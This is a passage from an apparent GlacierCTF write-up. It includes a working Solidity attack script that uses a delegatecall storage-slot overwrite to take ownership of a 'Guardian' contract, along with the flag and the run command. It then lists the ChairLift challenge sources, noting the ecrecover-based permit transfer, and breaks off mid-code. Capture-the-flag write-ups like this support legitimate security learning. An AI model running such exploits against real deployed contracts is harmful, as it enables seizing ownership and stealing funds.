</span></code></pre><p>Observations :<ol><li>Setup contract deployes Guardian and GlacierVault contracts<li>Guardian contract uses GlacierVault logic to perform some task<li>Guardian contract <code>delegatecall</code>'s the GlacierVault</ol><p>Goal :<ul><li>Put the Guardian contract into sleep</ul><p>To put the Guardian contract into sleep we need to call the <code>punch()</code> with 10_000_000 ethers or we have to be the owner of the contract. Point to note about delegatecall is "With delegatecall, only the code of the given address is used but all other aspects (storage, balance, msg.sender etc.) are taken from the current contract. The purpose of delegatecall is to use library/logic code which is stored in callee contract but operate on the state of the caller contract".<p>So, here the call to GlacierVault will effect the storage layout of the Guardian contract. I tried to call the <code>quickStore()</code> function with arguements (0,1) on Guardian contract which delegates the call to GlacierVault. In result the owner variable slot of the Guardian contract was overridden with 1. So, we can able to overwrite the owner of the Guardian by calling quickStore() function. Now simply I called the quickStore() function with address of my attack contract instead of 1. So it will override the owner to my Attack contract address. Now we can call the <code>putToSleep()</code> function.<p><code>GlacierVaultAttack.s.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Setup} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/GlacierVault/Setup.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Guardian} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/GlacierVault/Guardian.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Script} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{console} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span>
</span><span>contract AttackScript is Script{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>public</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>();
</span><span>        </span><span style=color:#a71d5d;font-weight:700>new </span><span>Attack{value</span><span style=color:#a71d5d;font-weight:700>: </span><span style=color:#0086b3>10 </span><span>ether}().</span><span style=color:#795da3;font-weight:700>exploit</span><span>();
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attack Success"</span><span>);
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    Setup public setupContract </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Setup</span><span>(</span><span style=color:#0086b3>0x4b4b43d0E6dc47aC7274EA3a2463C87116282700</span><span>);
</span><span>    Guardian public </span><span style=color:#0086b3>TARGET </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Guardian</span><span>(</span><span style=color:#795da3;font-weight:700>payable</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(setupContract.</span><span style=color:#795da3;font-weight:700>TARGET</span><span>())));
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>() payable {
</span><span>        </span><span style=color:#62a35c>require</span><span>(msg.value </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>10 </span><span>ether);
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        (bool success, ) </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>TARGET</span><span>).call{value:</span><span style=color:#0086b3>1337</span><span>}(
</span><span>            abi.</span><span style=color:#795da3;font-weight:700>encodeWithSignature</span><span>(</span><span style=color:#183691>"quickStore(uint8,uint256)"</span><span>, </span><span style=color:#0086b3>0</span><span>, </span><span style=color:#795da3;font-weight:700>address</span><span>(this))
</span><span>            );
</span><span>        </span><span style=color:#62a35c>require</span><span>(success, </span><span style=color:#183691>"Call failed"</span><span>);
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>putToSleep</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#969896;font-style:italic>// gctf{h3's_sl33pIng_BuT_ju5t_4_n0w}
</span></code></pre><p>Run the following command to solve the challenge<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>forge script script/GlacierVaultAttack.sol:AttackScript --rpc-url </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span>RPC-URL</span><span style=color:#a71d5d;font-weight:700>> </span><span>--private-key </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span>REDACTED</span><span style=color:#a71d5d;font-weight:700>> </span><span>--broadcast
</span></code></pre><h2 id=chairlift-397pts>ChairLift [397pts]</h2><pre style=color:#323232;background-color:#fff><code><span>Description : 
</span><span>
</span><span>"After you have defeated the monkeys you see a chairlift that will take you to the summit cross, this is your final step to reach the peak."
</span><span>
</span><span>author: J4X
</span><span>
</span><span>nc chall.glacierctf.com 13381
</span><span>
</span><span>Attached Files : [Setup.sol, ChairLift.sol, Ticket.sol]
</span></code></pre><p><code>Setup.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"./ChairLift.sol"</span><span>;
</span><span>
</span><span>contract Setup {
</span><span>    ChairLift public immutable </span><span style=color:#0086b3>TARGET</span><span>; </span><span style=color:#969896;font-style:italic>// Contract the player will hack
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>() payable {
</span><span>        </span><span style=color:#62a35c>require</span><span>(msg.value </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>100 </span><span>ether);
</span><span>        </span><span style=color:#969896;font-style:italic>// Deploy the victim contract
</span><span>        </span><span style=color:#0086b3>TARGET </span><span style=color:#a71d5d;font-weight:700>= new </span><span>ChairLift();
</span><span>        </span><span style=color:#969896;font-style:italic>// Check if buying a ticket works
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>buyTicket</span><span>();
</span><span>        </span><span style=color:#969896;font-style:italic>// Check if taking a ride works
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>takeRide</span><span>(</span><span style=color:#0086b3>0</span><span>);
</span><span>    }
</span><span>    </span><span style=color:#969896;font-style:italic>// Our challenge in the CTF framework will call this function to
</span><span>    </span><span style=color:#969896;font-style:italic>// check whether the player has solved the challenge or not.
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() </span><span style=color:#795da3;font-weight:700>public view returns </span><span>(bool) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>tripsTaken</span><span>() </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>2</span><span>;
</span><span>    }
</span><span>}
</span></code></pre><p><code>ChairLift.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>18</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"./Ticket.sol"</span><span>;
</span><span>
</span><span>contract ChairLift
</span><span>{
</span><span>    uint256 public tripsTaken;
</span><span>    Ticket public ticket;
</span><span>    address owner;
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor </span><span>()
</span><span>    {
</span><span>        ticket </span><span style=color:#a71d5d;font-weight:700>= new </span><span>Ticket(</span><span style=color:#183691>"Chairlift Ticket"</span><span>);
</span><span>        owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>    }
</span><span>    </span><span style=color:#969896;font-style:italic>//To get a ride you have to buy a ticket first
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>buyTicket</span><span>() </span><span style=color:#795da3;font-weight:700>external payable
</span><span>    {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(msg.sender </span><span style=color:#a71d5d;font-weight:700>!= </span><span>owner)
</span><span>        {
</span><span>            </span><span style=color:#62a35c>require </span><span>(msg.value </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>100_000 </span><span>ether, </span><span style=color:#183691>"Ticket costs 100,000 ether, inflation has been hitting us hard too"</span><span>);
</span><span>        }
</span><span>        
</span><span>        ticket.</span><span style=color:#795da3;font-weight:700>mint</span><span>(msg.sender);
</span><span>    } 
</span><span>    </span><span style=color:#969896;font-style:italic>//USing your ticket you can take a ride on the chairlift
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>takeRide</span><span>(uint256 ticketId) </span><span style=color:#795da3;font-weight:700>external
</span><span>    {
</span><span>        </span><span style=color:#62a35c>require </span><span>(ticket.</span><span style=color:#795da3;font-weight:700>ownerOf</span><span>(ticketId) </span><span style=color:#a71d5d;font-weight:700>== </span><span>msg.sender, </span><span style=color:#183691>"You don't own this ticket"</span><span>);
</span><span>        tripsTaken </span><span style=color:#a71d5d;font-weight:700>+= </span><span style=color:#0086b3>1</span><span>;
</span><span>        ticket.</span><span style=color:#795da3;font-weight:700>burn</span><span>(ticketId);
</span><span>    }
</span><span>}
</span></code></pre><p><code>Ticket.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span>contract Ticket {
</span><span>    bytes32 private constant </span><span style=color:#0086b3>DOMAIN_SEPARATOR_TYPEHASH </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>keccak256</span><span>(</span><span style=color:#183691>"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"</span><span>);
</span><span>    bytes32 private constant </span><span style=color:#0086b3>PERMIT_TYPEHASH </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>keccak256</span><span>(</span><span style=color:#183691>"Permit(address from,address to,uint256 tokenId,uint256 nonce,uint256 deadline)"</span><span>);
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>mapping</span><span>(address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>uint256) public nonces;
</span><span>    </span><span style=color:#795da3;font-weight:700>mapping </span><span>(uint256 </span><span style=color:#a71d5d;font-weight:700>=> </span><span>address) private _owners;
</span><span>    </span><span style=color:#795da3;font-weight:700>mapping </span><span>(uint256 </span><span style=color:#a71d5d;font-weight:700>=> </span><span>address) private _tokenApprovals;
</span><span>    </span><span style=color:#795da3;font-weight:700>mapping </span><span>(address </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#795da3;font-weight:700>mapping </span><span>(address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>bool)) private _operatorApprovals;
</span><span>
</span><span>    string private _name;
</span><span>    address owner;
</span><span>    uint256 id;
</span><span>
</span><span>    event </span><span style=color:#795da3;font-weight:700>Transfer</span><span>(address indexed from, address indexed to, uint256 indexed tokenId);
</span><span>    event </span><span style=color:#795da3;font-weight:700>Approval</span><span>(address indexed _owner, address indexed approved, uint256 indexed tokenId);
</span><span>    event </span><span style=color:#795da3;font-weight:700>ApprovalForAll</span><span>(address indexed _owner, address indexed operator, bool approved);
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>(string memory name_) {
</span><span>        _name </span><span style=color:#a71d5d;font-weight:700>= </span><span>name_;
</span><span>        owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>        id </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>//------------------------------------------------ PUBLIC FUNCTIONS ------------------------------------------------//
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>ownerOf</span><span>(uint256 tokenId) </span><span style=color:#795da3;font-weight:700>public view returns </span><span>(address) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>_owners[tokenId];
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>approve</span><span>(address to, uint256 tokenId) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        address ticketOwner </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>ownerOf</span><span>(tokenId);
</span><span>        </span><span style=color:#62a35c>require</span><span>(to </span><span style=color:#a71d5d;font-weight:700>!= </span><span>ticketOwner, </span><span style=color:#183691>"Ticket: approval to current owner"</span><span>);
</span><span>        </span><span style=color:#62a35c>require</span><span>(msg.sender </span><span style=color:#a71d5d;font-weight:700>== </span><span>ticketOwner </span><span style=color:#a71d5d;font-weight:700>|| </span><span style=color:#795da3;font-weight:700>isApprovedForAll</span><span>(ticketOwner, msg.sender),
</span><span>            </span><span style=color:#183691>"Ticket: approve caller is not owner nor approved for all"
</span><span>        );
</span><span>        _tokenApprovals[tokenId] </span><span style=color:#a71d5d;font-weight:700>= </span><span>to;
</span><span>        emit </span><span style=color:#795da3;font-weight:700>Approval</span><span>(ticketOwner, to, tokenId);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getApproved</span><span>(uint256 tokenId) </span><span style=color:#795da3;font-weight:700>public view returns </span><span>(address) {
</span><span>        </span><span style=color:#62a35c>require</span><span>(_owners[tokenId] </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0</span><span>), </span><span style=color:#183691>"Ticket: approved query for nonexistent token"</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>_tokenApprovals[tokenId];
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setApprovalForAll</span><span>(address operator, bool approved) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#62a35c>require</span><span>(operator </span><span style=color:#a71d5d;font-weight:700>!= </span><span>msg.sender, </span><span style=color:#183691>"Ticket: approve to caller"</span><span>);
</span><span>        _operatorApprovals[msg.sender][operator] </span><span style=color:#a71d5d;font-weight:700>= </span><span>approved;
</span><span>        emit </span><span style=color:#795da3;font-weight:700>ApprovalForAll</span><span>(msg.sender, operator, approved);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isApprovedForAll</span><span>(address _owner, address operator) </span><span style=color:#795da3;font-weight:700>public view returns </span><span>(bool) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>_operatorApprovals[_owner][operator];
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>transferFrom</span><span>(address from, address to, uint256 tokenId) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#62a35c>require</span><span>(</span><span style=color:#795da3;font-weight:700>_isApprovedOrOwner</span><span>(msg.sender, tokenId), </span><span style=color:#183691>"Ticket: transfer caller is not owner nor approved"</span><span>);
</span><span>        </span><span style=color:#795da3;font-weight:700>_transfer</span><span>(from, to, tokenId);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>safeTransferFrom</span><span>(address from, address to, uint256 tokenId) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#795da3;font-weight:700>safeTransferFrom</span><span>(from, to, tokenId, </span><span style=color:#183691>""</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>safeTransferFrom</span><span>(address from, address to, uint256 tokenId, bytes memory _data) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#62a35c>require</span><span>(</span><span style=color:#795da3;font-weight:700>_isApprovedOrOwner</span><span>(msg.sender, tokenId), </span><span style=color:#183691>"Ticket: transfer caller is not owner nor approved"</span><span>);
</span><span>        </span><span style=color:#795da3;font-weight:700>_safeTransfer</span><span>(from, to, tokenId, _data);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>transferWithPermit</span><span>(address from, address to, uint256 tokenId, uint256 deadline, uint8 v, bytes32 r, bytes32 s) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#62a35c>require</span><span>(block.timestamp </span><span style=color:#a71d5d;font-weight:700>&lt;= </span><span>deadline, </span><span style=color:#183691>"Ticket: permit expired"</span><span>);
</span><span>        bytes32 digest </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>keccak256</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encodePacked</span><span>(</span><span style=color:#183691>"</span><span style=color:#0086b3>\x19\x01</span><span style=color:#183691>"</span><span>, </span><span style=color:#795da3;font-weight:700>_getDomainSeparator</span><span>(), </span><span style=color:#795da3;font-weight:700>keccak256</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encode</span><span>(</span><span style=color:#0086b3>PERMIT_TYPEHASH</span><span>, from, to, tokenId, nonces[from]</span><span style=color:#a71d5d;font-weight:700>++</span><span>, deadline))));
</span><span>        address signer </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>ecrecover</span><span>(digest, v, r, s);
</span><span>        </span><span style=color:#62a35c>require</span><span>(signer </span><span style=color:#a71d5d;font-weight:700>== </span><span>from, </span><span style=color:#183691>"Ticket: invalid permit"</span><span>);
</span><span>        </span><span style=color:#795da3;font-weight:700>_transfer</span><span>(from, to, tokenId);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>mint</span><span>(address target) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#62a35c>require</span><span>(msg.sender </span><span style=color:#a71d5d;font-weight:700>== </span><span>owner, </span><span style=color:#183691>"Ticket: Only the owner can mint tickets"</span><span>);
</span><span>        
</span><span>        _owners[id] </span><span style=color:#a71d5d;font-weight:700>= </span><span>target;
</span><span>
</span><span>        id</span><span style=color:#a71d5d;font-weight:700>++</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>burn</span><span>(uint256 tokenId) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>        </span><span style=color:#62a35c>require</span><span>(msg.sender </span><span style=color:#a71d5d;font-weight:700>== </span><span>owner, </span><span style=color:#183691>"Ticket: caller is not owner nor approved"</span><span>);
</span><span>        
</span><span>        _owners[tokenId] </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>//------------------------------------------------ INTERNAL FUNCTIONS ------------------------------------------------//
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_transfer</span><span>(address from, address to, uint256 tokenId) </span><span style=color:#795da3;font-weight:700>internal </span><span>{
</span><span>        </span><span style=color:#62a35c>require</span><span>(</span><span style=color:#795da3;font-weight:700>ownerOf</span><span>(tokenId) </span><span style=color:#a71d5d;font-weight:700>== </span><span>from, </span><span style=color:#183691>"Ticket: transfer of token that is not own"</span><span>);
</span><span>        </span><span style=color:#62a35c>require</span><span>(to </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0</span><span>), </span><span style=color:#183691>"Ticket: transfer to the zero address"</span><span>);
</span><span>
</span><span>        _owners[tokenId] </span><span style=color:#a71d5d;font-weight:700>= </span><span>to;
</span><span>
</span><span>        emit </span><span style=color:#795da3;font-weight:700>Transfer</span><span>(from, to, tokenId);
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_safeTransfer</span><span>(address from, address to, uint256 tokenId, bytes memory _data) </span><span style=color:#795da3;font-weight:700>internal </span><span>{
</span><span>        </span><span style=color:#795da3;font-weight:700>_transfer</span><span>(from, to, tokenId);
</span><span>        </span><span style=color:#62a35c>require</span><span>(</span><span style=color:#795da3;font-weight:700>_checkOnERC721Received</span><span>(from, to, tokenId, _data), </span><span style=color:#183691>"Ticket: transfer to non ERC721Receiver implementer"</span><span>);
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_checkOnERC721Received</span><span>(address from, address to, uint256 tokenId, bytes memory _data) </span><span style=color:#795da3;font-weight:700>internal returns </span><span>(bool) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#795da3;font-weight:700>_isContract</span><span>(to)) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>try </span><span style=color:#795da3;font-weight:700>IERC721Receiver</span><span>(to).</span><span style=color:#795da3;font-weight:700>onERC721Received</span><span>(msg.sender, from, tokenId, _data) </span><span style=color:#795da3;font-weight:700>returns </span><span>(bytes4 retval) {
</span><span>                </span><span style=color:#a71d5d;font-weight:700>return </span><span>retval </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#795da3;font-weight:700>IERC721Receiver</span><span>(to).onERC721Received.selector;
</span><span>            } </span><span style=color:#a71d5d;font-weight:700>catch </span><span>(bytes memory reason) {
</span><span>                </span><span style=color:#a71d5d;font-weight:700>if </span><span>(reason.length </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>0</span><span>) {
</span><span>                    </span><span style=color:#795da3;font-weight:700>revert</span><span>(</span><span style=color:#183691>"Ticket: transfer to non ERC721Receiver implementer"</span><span>);
</span><span>                } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>                    assembly {
</span><span>                        </span><span style=color:#795da3;font-weight:700>revert</span><span>(</span><span style=color:#795da3;font-weight:700>add</span><span>(</span><span style=color:#0086b3>32</span><span>, reason), </span><span style=color:#795da3;font-weight:700>mload</span><span>(reason))
</span><span>                    }
</span><span>                }
</span><span>            }
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>true</span><span>;
</span><span>        }
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_isApprovedOrOwner</span><span>(address spender, uint256 tokenId) </span><span style=color:#795da3;font-weight:700>internal view returns </span><span>(bool) {
</span><span>        </span><span style=color:#62a35c>require</span><span>(_owners[tokenId] </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0</span><span>), </span><span style=color:#183691>"Ticket: operator query for nonexistent token"</span><span>);
</span><span>        address _owner </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>ownerOf</span><span>(tokenId);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>(spender </span><span style=color:#a71d5d;font-weight:700>== </span><span>_owner </span><span style=color:#a71d5d;font-weight:700>|| </span><span style=color:#795da3;font-weight:700>getApproved</span><span>(tokenId) </span><span style=color:#a71d5d;font-weight:700>== </span><span>spender </span><span style=color:#a71d5d;font-weight:700>|| </span><span style=color:#795da3;font-weight:700>isApprovedForAll</span><span>(_owner, spender));
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_approve</span><span>(address to, uint256 tokenId) </span><span style=color:#795da3;font-weight:700>internal </span><span>{
</span><span>        _tokenApprovals[tokenId] </span><span style=color:#a71d5d;font-weight:700>= </span><span>to;
</span><span>        emit </span><span style=color:#795da3;font-weight:700>Approval</span><span>(</span><span style=color:#795da3;font-weight:700>ownerOf</span><span>(tokenId), to, tokenId);
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_getChainId</span><span>() </span><span style=color:#795da3;font-weight:700>internal view returns </span><span>(uint256 chainId) {
</span><span>        assembly {
</span><span>            chainId :</span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>chainid</span><span>()
</span><span>        }
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_getDomainSeparator</span><span>() </span><span style=color:#795da3;font-weight:700>private view returns </span><span>(bytes32) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#795da3;font-weight:700>keccak256</span><span>(abi.</span><span style=color:#795da3;font-weight:700>encode</span><span>(
</span><span>            </span><span style=color:#0086b3>DOMAIN_SEPARATOR_TYPEHASH</span><span>,
</span><span>            </span><span style=color:#795da3;font-weight:700>keccak256</span><span>(</span><span style=color:#795da3;font-weight:700>bytes</span><span>(_name)),
</span><span>            </span><span style=color:#795da3;font-weight:700>keccak256</span><span>(</span><span style=color:#795da3;font-weight:700>bytes</span><span>(</span><span style=color:#183691>"1"</span><span>)),
</span><span>            </span><span style=color:#795da3;font-weight:700>_getChainId</span><span>(),
</span><span>            </span><span style=color:#795da3;font-weight:700>address</span><span>(this)
</span><span>        ));
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_isContract</span><span>(address _addr) </span><span style=color:#795da3;font-weight:700>private view returns </span><span>(bool){
</span><span>        uint32 size;
</span><span>        assembly {
</span><span>            size :</span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>extcodesize</span><span>(_addr)
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>(size </span><span style=color:#a71d5d;font-weight:700>> </span><span style=color:#0086b3>0</span><span>);
</span><span>    }
</span><span>}
</span><span style=color:#a71d5d;font-weight:700>interface </span><span>IERC721Receiver {
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>onERC721Received</span><span>(address operator, address from, uint256 tokenId, bytes calldata data) </span><span style=color:#795da3;font-weight:700>external returns </span><span>(bytes4);
</span><span>}
</span><span>
</span></code></pre><p>Observations :<ol><li>Setup contract deploys ChairLift contract and updates tripsTaken to 1<li>ChairLift contract deploys and uses Ticket contract<li>Ticket contract is not a standard token contract<li>Ticket contract uses <code>ecrecover</code> to verify the signature</ol><p>Goal :<ul><li>Goal is to update the tripsTaken variable to 2</ul><p>To update the tripsTaken we have to call the function <code>takeRide()</code> with a ticket Id as arguement.<pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>takeRide</span><span>(uint256 ticketId) </span><span style=color:#795da3;font-weight:700>external
</span><span>{
</span><span>    </span><span style=color:#62a35c>require </span><span>(ticket.</span><span style=color:#795da3;font-weight:700>ownerOf</span><span>(ticketId) </span><span style=color:#a71d5d;font-weight:700>== </span><span>msg.sender, </span><span style=color:#183691>"You don't own this ticket"</span><span>);
</span><span>    tripsTaken </span><span style=color:#a71d5d;font-weight:700>+= </span><span style=color:#0086b3>1</span><span>;
</span><span>    ticket.</span><span style=color:#795da3;font-weight:700>burn</span><span>(ticketId);
</span><span>}
</span></code></pre><p>To call the takeRide function we need a ticket. To buy a ticket it costs 1 million ether, too expensive ride. So we need find a way to steal ticket.<p>There is an interesting function <code>transferWithPermit()</code> which uses ecrecover to verify signature.<pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>transferWithPermit</span><span>(address from, address to, uint256 tokenId, uint256 deadline, uint8 v, bytes32 r, bytes32 s) </span><span style=color:#795da3;font-weight:700>public </span><span>{
</span><span>    </span><span style=color:#62a35c>require</span><span>(block.timestamp </span><span style=color:#a71d5d;font-weight:700>&lt;= </span><span>deadline, </span><span style=color:#183691>"Ticket: permit expired"</span><span>);
